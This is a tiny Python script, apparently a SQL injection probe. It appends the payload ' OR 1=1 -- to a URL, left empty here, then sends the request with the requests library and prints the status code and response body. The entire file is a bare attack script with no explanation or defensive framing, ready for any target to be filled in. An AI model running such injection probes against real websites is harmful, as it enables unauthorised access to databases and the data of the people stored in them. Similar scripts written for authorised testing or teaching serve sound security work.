import requests

url=""
payload= "' OR 1=1 --"

forgedUrl=url+payload

r=requests.get(forgedUrl)
print(r.status_code)
out = r.content
print(out)
